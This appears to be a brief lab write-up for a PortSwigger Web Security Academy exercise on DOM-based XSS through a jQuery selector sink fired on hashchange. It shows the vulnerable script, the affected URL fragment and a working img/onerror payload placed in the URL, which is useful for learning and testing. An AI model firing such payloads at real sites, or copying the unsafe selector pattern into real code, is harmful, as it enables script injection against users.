### Lab: DOM XSS in jQuery selector sink using a hashchange event

#### **Recon:**
-----
**Request:**
```http
GET / HTTP/2
Host: 0aa5007d04e9857b8294106000cf0098.web-security-academy.net

...Omitted for Brevety...
```
**Response:**
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 6239

...Omitted for Brevety...
```

`view-source:https://098.web-security-academy.net
```html
<script>
	$(window).on('hashchange', function(){
		var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
		if (post) post.get(0).scrollIntoView();
	});
</script>
```

**Affected Location:**
```
https://098.web-security-academy.net/#
```
### **Exploitation**
-----
**Payload:** 
```js
%20<img%20src=0%20onerror=alert('xss')>
```
**On url**
```
https://094.web-security-academy.net/#%20%3Cimg%20src=0%20onerror=alert('xss')%3E
```